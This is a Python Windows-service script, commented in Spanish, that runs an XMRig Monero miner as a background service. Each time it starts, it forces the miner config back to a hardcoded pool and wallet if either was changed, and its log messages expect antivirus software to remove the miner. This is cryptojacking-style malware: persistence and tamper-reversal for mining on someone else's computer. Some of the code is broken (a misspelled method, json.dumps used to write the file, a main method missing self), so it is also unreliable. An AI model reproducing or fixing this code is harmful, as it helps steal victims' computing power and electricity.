import win32service
import win32serviceutil
import win32event
import sys,json,win32evtlog,win32evtlogutil,servicemanager
from logging.handlers import RotatingFileHandler
import logging
from pathlib import Path

class LSoftware(win32serviceutil.ServiceFramework):
    _svc_name_ = "LSoftware"
    _svc_display_name_ = "LMiner"
    _svc_description_ = "Controlador de Minero :3"


    def __init__(self, args):
        super().__init__(args)

        self.stop_event = win32event.CreateEvent(None,0,0,None)

        self.Master = Path(sys.executable).parent

        self.Rprincipal = self.Master / "xmrig-6.25.0"

        log = self.Master / "logs"
        
        if log.exists() and log.is_dir():
            pass
        else:
            log.mkdir(exist_ok=True)

        loggerI = log / "minerlog.log"
        loggerC = log / "CRITICALMinerlog"

        self.loger = logging.getLogger("LMiner")
        self.loger.setLevel(logging.DEBUG)
        self.loger.propagate = False
        self.logI = RotatingFileHandler(
            filename=loggerI,
            maxBytes=2_000_000,
            backupCount=3
        )
        self.logI.setLevel(logging.INFO)
        self.logC = RotatingFileHandler(
            filename=loggerC,
            maxBytes=2_000_000,
            backupCount=2
        )
        self.logC.setLevel(logging.CRITICAL)


        formato = logging.Formatter(
            "%(asctime)s | %(levelname)s | %(message)s"
        )
        for h in (self.logI,self.logC):
            h.setFormatter(formato)
            self.loger.addHandler(h)
        
        self.loger.info("Loger Iniciado....")
        if self.Rprincipal.exists() and self.Rprincipal.Is_dir():
            self.loger.info("El minero existe :3")
        else:
            self.loger.fatal("Nms el minador no existe se lo chingo el AV...")
        
        self.loger.info("Servicio iniciado Correctamente")

        config = self.Rprincipal / "config.json"

        with open(config,"r",encoding="utf-8") as f:
            data = json.load(f)

        pool = data["pools"][0]

        if pool["url"] == "gulf.moneroocean.stream:10128" and pool["user"] == "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB":
            self.loger.info("Configuracion de dirreccion minera cargada correctamente")
        elif pool["url"] != "gulf.moneroocean.stream:10128" and pool["user"] == "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB":
            self.loger.error(f"Hubo un cambio en la direccion de la pool:{pool['url']}")
            
            data["pools"][0]["url"] = "gulf.moneroocean.stream:10128"
            with open(config,"w",encoding="utf-8") as f:
                json.dumps(data,f,indent=2)

            self.loger.info("Error de pool corregido")
        elif pool["user"] != "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB" and pool["url"] == "gulf.moneroocean.stream:10128":
            self.loger.error(f"Hubo un cambio en la wallet de el pool:{pool['user']}")

            data["pools"][0]["user"] = "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB"
            with open(config,"w",encoding="utf-8") as f:
                json.dumps(data,f,indent=2)
            
            self.loger.info("Error de pool corregido")
        else:
            self.loger.error(f"Se cambiaron los parametros de configuracion")

            data["pools"][0]["user"] = "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB"
            data["pools"][0]["url"] = "gulf.moneroocean.stream:10128"

            with open(config,"w",encoding="utf-8") as f:
                json.dumps(data,f,indent=2)

        
    def SvcDoRun(self):
        self.main()


    def main():
        import time
        while True:
            time.sleep(2)